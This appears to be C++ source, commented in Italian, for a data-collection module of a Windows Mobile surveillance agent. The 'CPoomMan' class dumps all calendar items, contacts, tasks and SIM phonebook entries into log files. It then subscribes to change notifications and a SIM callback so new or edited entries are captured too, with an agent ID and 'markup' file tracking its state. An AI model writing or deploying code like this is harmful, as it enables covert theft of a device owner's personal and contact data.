#define INITGUID

#include <windows.h>
#include <winbase.h>
#include <pimstore.h>

#include "PoomMan.h"
#include "PoomSerializer.h"
#include "Log.h"

#include "PoomContact.h"
#include "PoomCalendar.h"
//#include "PoomCalendarReader.h"
#include "PoomTask.h"

// XXX Occhio che le funzioni OLE NON SONO thread safe, quindi questa classe
// non la possiamo richiamare da piu' thread contemporaneamente
CPoomMan* CPoomMan::m_pInstance = NULL;
volatile LONG CPoomMan::lLock = 0;

IPoomFolderReader::IPoomFolderReader(IFolder *pIfolder)
	:	_pIFolder(pIfolder)
{
}

IPOutlookItemCollection* IPoomFolderReader::getItemCollection()
{
	HRESULT hr;
	IPOutlookItemCollection* pCollection = NULL;

	if (_pIFolder != NULL) {
		hr = _pIFolder->get_Items(&pCollection);

		if (FAILED(hr))
			return NULL;
	}

	return pCollection;
}

IPoomFolderReader::~IPoomFolderReader()
{
	if (_pIFolder != NULL) {
		_pIFolder->Release();
		_pIFolder = NULL;
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////	PoomMan					/////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////
CPoomMan* CPoomMan::self()
{
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		Sleep(1);

	if (m_pInstance == NULL)
		m_pInstance = new(std::nothrow) CPoomMan();

	InterlockedExchange((LPLONG)&lLock, 0);

	return m_pInstance;
}

CPoomMan::CPoomMan() : m_pIPoomApp(NULL), m_bIsValid(FALSE), m_bCoUnInitialize(FALSE)
{	
	HRESULT hr;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);

	if (hr == S_FALSE) {
		DBG_TRACE(L"Debug - PoomMan.cpp - CPoomMan CoInitializeEx S_FALSE \n", 5, FALSE);
		CoUninitialize();
		return;
	}

	if (FAILED(hr)) {
		DBG_TRACE(L"Debug - PoomMan.cpp - CPoomMan CoInitializeEx FAILED \n", 5, FALSE);
		return;
	}

	hr = CoCreateInstance(CLSID_Application,
							NULL,
							CLSCTX_INPROC_SERVER,
							IID_IPOutlookApp,
							(LPVOID*) &m_pIPoomApp);

	if (FAILED(hr)) {
		DBG_TRACE(L"Debug - PoomMan.cpp - CPoomMan CoCreateInstance FAILED \n", 5, FALSE);
		CoUninitialize();
		return;
	}

	HWND win = CreateWindow(L"STATIC", L"Window", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);

	hr = m_pIPoomApp->Logon((long) win);

	if (FAILED(hr)) {
		DBG_TRACE(L"Debug - PoomMan.cpp - CPoomMan Logon FAILED \n", 5, FALSE);
		CoUninitialize();
		return;
	}

	m_bIsValid = TRUE;
	m_bCoUnInitialize = TRUE;
}

CPoomMan::~CPoomMan()
{
	if (m_hSim != NULL) {
		SimDeinitialize(m_hSim);
		m_hSim = NULL;
	}

	if (m_pIPoomApp) {
		m_pIPoomApp->Logoff();
		m_pIPoomApp->Release();
	}

	CPoomMan::m_pInstance = NULL;

	if (m_bCoUnInitialize)
		CoUninitialize();
}

void CPoomMan::_Export()
{
	CPoomFolderFactor *factor = new(nothrow) CPoomFolderFactor();

	if (factor == NULL)
		return;

	IFolder *pIFolder = NULL;

#define EXPORT_FOLDER(x)	if (SUCCEEDED( m_pIPoomApp->GetDefaultFolder(x, &pIFolder))){		\
								IPoomFolderReader *reader = _Export(factor->get(x, pIFolder));	\
								if (reader) delete reader;										\
								pIFolder->Release();											\
								pIFolder = NULL;												\
							}

	EXPORT_FOLDER(olFolderCalendar);	
	EXPORT_FOLDER(olFolderContacts);
	EXPORT_FOLDER(olFolderTasks);
	// Contatti SIM
	IPoomFolderReader* pSIMreader = _Export(factor->get((OlDefaultFolders) olFolderContactsSim, NULL));
	
	if (pSIMreader != NULL)
		delete pSIMreader;

	delete factor;
}

IPoomFolderReader* CPoomMan::_Export(IPoomFolderReader *reader)
{
	HRESULT hr;
	UINT uBufLen = 0;
	LPBYTE pBuffer = NULL;
	
	if (reader == NULL) {
		DBG_TRACE(L"Debug - PoomMan.cpp - _Export(IPoomFolderReader *reader)) reader == NULL \n", 5, FALSE);
		return reader;
	}

	INT nCount = reader->Count();
	DBG_TRACE_INT(L"Debug - PoomMan.cpp - _Export(IPoomFolderReader *reader)) item count: \n", 5, FALSE, nCount);

	if (nCount > 0) {
		CPoomSerializer pPoomSerializer;

		Log poomLog = Log();
		poomLog.CreateLog(reader->GetType(), NULL, 0, FLASH);
		
		for (INT i = 1; i <= nCount; i++) {	
			hr = reader->Get(i, &pPoomSerializer, &pBuffer, &uBufLen);
			if (S_OK == hr) {
				if (pBuffer != NULL) {
					poomLog.WriteLog(pBuffer, uBufLen);
					SAFE_DELETE(pBuffer);
				}
			} else {
				// empty slot
				if (hr != 0x88000345) {
					DBG_TRACE_INT(L"Debug - PoomMan.cpp - _Export(IPoomFolderReader *reader)) Get FAILED hr:", 5, FALSE, hr);
				}
			}
		}
		 
		poomLog.CloseLog();
	}

	return reader;
}

void CPoomMan::_ExportOne(DWORD dwType, LONG lOid)
{	
	CPoomFolderFactor *factor = new CPoomFolderFactor();
	IFolder *pIFolder = NULL;

	if (SUCCEEDED(m_pIPoomApp->GetDefaultFolder((int)dwType, &pIFolder))){
		IPoomFolderReader *reader = _ExportOne(factor->get((OlDefaultFolders) dwType, pIFolder), lOid);

		if (reader)
			delete reader;

		pIFolder->Release();
		pIFolder = NULL;
	}  else {
		DBG_TRACE(L"Debug - PoomMan.cpp - _ExportOne(DWORD dwType, LONG lOid) error GetDefaultFolder()\n", 5, FALSE);
	}

	if (factor)
		delete factor;
}

IPoomFolderReader* CPoomMan::_ExportOneSIM(IPoomFolderReader *reader, UINT uIndex)
{
	UINT uBufLen = 0;
	LPBYTE pBuffer = NULL;

	if (reader == NULL)
		return reader;

	CPoomSerializer pPoomSerializer;

	if (SUCCEEDED(reader->Get(uIndex, &pPoomSerializer, &pBuffer, &uBufLen))) {
		Log poomLog = Log();

		if (pBuffer) {
			poomLog.CreateLog(reader->GetType(), NULL, 0, FLASH);
			poomLog.WriteLog(pBuffer, uBufLen);			
			poomLog.CloseLog();
			SAFE_DELETE(pBuffer);
		}
	}

	return reader;
}

void CPoomMan::_ExportOneSIM(DWORD dwType, UINT uIndex)
{	
	CPoomFolderFactor *factor = new(nothrow) CPoomFolderFactor();

	if (factor == NULL)
		return;

	IPoomFolderReader *reader = _ExportOneSIM(factor->get((OlDefaultFolders) olFolderContactsSim, NULL), uIndex);

	if (reader)
		delete reader;

	delete factor;
}

IPoomFolderReader* CPoomMan::_ExportOne(IPoomFolderReader *reader, LONG lOid)
{
	if (reader == NULL)
		return reader;

	UINT uBufLen = 0;
	LPBYTE pBuffer = NULL;
	CPoomSerializer pPoomSerializer;
	
	if (SUCCEEDED(reader->GetOne(m_pIPoomApp, lOid, &pPoomSerializer, &pBuffer, &uBufLen))) {
		Log poomLog = Log();

		if (pBuffer) {
			poomLog.CreateLog(reader->GetType(), NULL, 0, FLASH);
			poomLog.WriteLog(pBuffer, uBufLen);			
			delete[] pBuffer;
			poomLog.CloseLog();
		}  else {
			DBG_TRACE(L"Debug - PoomMan.cpp - _ExportOne(IPoomFolderReader *reader, LONG lOid) error pBuffer vuoto\n", 5, FALSE);
		}
	} else {
		DBG_TRACE(L"Debug - PoomMan.cpp - _ExportOne(IPoomFolderReader *reader, LONG lOid) error GetOne FAILED\n", 5, FALSE);
	}
	
	return reader;
}

void CPoomMan::Notifications()
{
	MSG msg;
	ZeroMemory(&msg, sizeof(MSG));

	BOOL bNew = FALSE;
	DWORD dwTime = 0;

	while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) != 0) {
		if (msg.message == PIM_ITEM_CREATED_REMOTE	||
			msg.message == PIM_ITEM_CHANGED_REMOTE ) {

			if (msg.lParam == olFolderCalendar ||
				msg.lParam == olFolderContacts ||
				msg.lParam == olFolderTasks) {
				DBG_TRACE(L"Debug - PoomMan.cpp - Notification New Notification\n", 5, FALSE);
				if (msg.lParam == olFolderCalendar) {
					if (msg.message == PIM_ITEM_CHANGED_REMOTE) {
						if (bNew && msg.time == dwTime)
							continue;
						DBG_TRACE(L"Debug - PoomMan.cpp - Notification PIM_ITEM_CHANGED_REMOTE NO ITEM\n", 5, FALSE);
						bNew = FALSE;
					} else {
						DBG_TRACE(L"Debug - PoomMan.cpp - Notification PIM_ITEM_CHANGED_REMOTE NEW ITEM\n", 5, FALSE);
						dwTime = msg.time;
						bNew = TRUE;
					}
				}
				m_pInstance->_ExportOne((DWORD) msg.lParam, (LONG) msg.wParam);
			}
		}
		DispatchMessage(&msg);
	}
}

HRESULT CPoomMan::_SubscribeToNotifications(IPOutlookApp *pPoom, OlDefaultFolders olFolder, UINT uiNotificationsType)
{
	HRESULT		hr          = 0;
	IFolder		*pFolder	= NULL;
	IItem		*pItem      = NULL;
	CEPROPVAL	propval     = {0};

	hr = pPoom->GetDefaultFolder(olFolder, &pFolder);

	if (FAILED(hr)) {
		DBG_TRACE(L"CPoomMan - _SubscribeToNotifications FAILED 1", 5, FALSE);
		return hr;
	}

	hr = pFolder->QueryInterface(IID_IItem, (LPVOID*)&pItem);

	if (FAILED(hr)) {
		DBG_TRACE(L"CPoomMan - _SubscribeToNotifications FAILED 1", 5, FALSE);
		pFolder->Release();
		return hr;
	}

	propval.propid = PIMPR_FOLDERNOTIFICATIONS;
	propval.val.ulVal = uiNotificationsType;
	
	hr = pItem->SetProps(0, 1, &propval);

	pItem->Release();
	pFolder->Release();

	return hr;
}

void CPoomMan::SimCallBack(DWORD dwNotifyCode, const void* lpData, DWORD dwDataSize, DWORD dwParam)
{
	if (lpData == NULL)
		return;

	if (dwNotifyCode == SIM_NOTIFY_PBE_STORED) {		// prendiamo solo le modifiche al phonebook
		SIMPBECHANGE* pPBNotify = (SIMPBECHANGE*) lpData;

		if (pPBNotify->dwStorage == SIM_PBSTORAGE_SIM) { // prendiamo solo i numeri standard
					
			_ExportOneSIM(103, pPBNotify->dwEntry);	// il tipo e' 103 per compatibilita'  
													// con le POOM (OlDefaultFolders) per eventuali sviluppi futuri
		}
	}
}

BOOL CPoomMan::_InitializeSIMCallback()
{
	HRESULT hr = E_FAIL;
	BOOL bRet = FALSE;

	hr = SimInitialize(SIM_INIT_SIMCARD_NOTIFICATIONS,
						(SIMCALLBACK)SimCallBack,
						0,
						&m_hSim);
	if (hr != S_OK) {
		DBG_TRACE(L"CPoomMan - _InitializeSIMCallback FAILED 1", 5, FALSE);
		return bRet;
	}

	return (bRet = TRUE);
}

void CPoomMan::Run(UINT uAgentId)
{
	DWORD dwNotify = 1;
	BYTE *pBuf = NULL;
	UINT uSize = sizeof(DWORD);

	if (!IsValid()) {
		m_pInstance = self();
	}

	Log pPOOMMarkup = Log();

	if (!pPOOMMarkup.IsMarkup(uAgentId)){
		// Export di tutti i dati
		m_pInstance->_Export();
		pPOOMMarkup.WriteMarkup(uAgentId,(BYTE *)&dwNotify, uSize);
	}

	pBuf = pPOOMMarkup.ReadMarkup(uAgentId, &uSize);
														   
	if (pBuf && uSize == sizeof(DWORD)) {
		CopyMemory(&dwNotify, pBuf, uSize);
		//SAFE_DELETE(pBuf);
		
		if (dwNotify == 1) {
			// Notifiche POOM
			_SubscribeToNotifications(m_pIPoomApp, olFolderContacts, PIMFOLDERNOTIFICATION_REMOTE);
			_SubscribeToNotifications(m_pIPoomApp, olFolderCalendar, PIMFOLDERNOTIFICATION_REMOTE);
			_SubscribeToNotifications(m_pIPoomApp, olFolderTasks, PIMFOLDERNOTIFICATION_REMOTE);
			// Notifiche SIM
			_InitializeSIMCallback();
			// Attesa delle notifiche di modifica o nuovo inserimento
			//return;
		}
	}

	SAFE_DELETE(pBuf);
	return;
}